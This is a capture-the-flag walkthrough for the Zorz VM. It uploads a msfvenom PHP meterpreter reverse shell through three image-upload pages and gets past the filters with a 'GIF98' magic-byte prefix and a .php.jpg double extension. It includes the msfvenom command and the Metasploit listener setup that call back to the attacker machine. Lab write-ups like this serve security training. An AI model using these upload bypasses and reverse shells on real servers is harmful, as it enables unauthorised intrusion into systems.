@@ -1,0 +1,69 @@
+
+Hack the Zorz VM (CTF Challenge)
+
+Zorz is another VM that will challenge your webapp skills. There are 3 separate challenges (web pages) on this machine. It should be pretty straight forward.  This machine will probably test your web app skills once again. There are 3 different pages that should be focused on(you will see). Your goal is to successfully upload a web-shell or malicious file to the server.
+You can download this machine from here.
+This machine (zorz) does not runs on vmware. So, in case you are using your Kali Linux in vmware(for attacking), you will probably need to run Zorz on a different system in Virtual Box and of course in the same network.
+Target: Zorz
+Attacker: Kali Linux
+Let’s start with our all time favourite netdiscover to get the victim machine’s IP.
+netdiscover
+
+So, our target is located on 192.168.1.8. Let’s quickly do a nmap scan to get an idea of open ports.
+nmap -p- -A 192.168.1.8
+
+Ok, so we have port 22 and port 80 open. Let’s visit the IP on our browser.
+
+So, we have an upload option available right in front of us. Let us quickly generate a php shell for reverse connection using msfvenom.
+msfvenom -p php/meterpreter/reverse_tcplhost=192.168.1.28 lport=4444 -f raw
+
+Next, we copy the generated script “<?php /*/……………………….die();” and paste it in a leafpad and save it as “shell.php”. Next we try to upload this file and voila, our shell gets uploaded successfully
+
+But we have no idea as to where our file gets uploaded on the server. In order to get the location/directory of our shell, we run dirbuster using the dictionary /usr/share/dirb/wordlists/big.txt
+
+And we get to know of a directory named “uploads2”. Upon visiting this directory, we do not find our shell.php file there. Thus we try to manipulate the directory name and visit the directory ”uploads1”.
+192.168.1.8/uploads1/
+
+And yes. Our shell.php file is here. Before opening the file, let’s set our listener using metasploit.
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.28
+set lport 4444
+exploit
+And then we return to our browser and click the shell.php file to open it.
+
+Success. We have successfully exploited the level 1 security and we have a meterpreter session running right before us.
+Now let’s go for the second level (Zorz Image Uploader 2) and try uploading the same file there.
+
+We get an error this time as expected.
+
+Time for some more tricks. Let us open the shell.php file in a text editor and just before our script, add the string “GIF98”.
+
+We now rename the file as “shell.php.jpg” and try to upload it once again.
+
+Upload successful
+
+This time the location of our file is “uploads2”. Let’s open it.
+192.168.1.8/uploads2/
+
+We send our previous meterpreter session to background and run the exploit once again.
+background
+run
+And thereafter we click on our “shell.php.jpg” file in the uploads2 directory to open it.
+
+Success again. We get our meterpreter session once again.
+Now for our final task, we open the third level (Zorz Image Uploader 3) in order to upload our shell once again.
+
+And without any edits to our “shell.php.jpg” file, we try uploading it here.
+
+The file uploads successfully once again. And this time the directory it has been uploaded to is uploads3.
+Let’s visit it.
+192.168.1.8/uploads3/
+
+We send our meterpreter session for level 2 to background once again and run the exploit yet again to exploit the third level.
+background
+run
+
+Mission accomplished. We have successfully bypassed all the three levels of security on this machine.
+Researcher and Author: Jitesh Khanna is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. contact here.
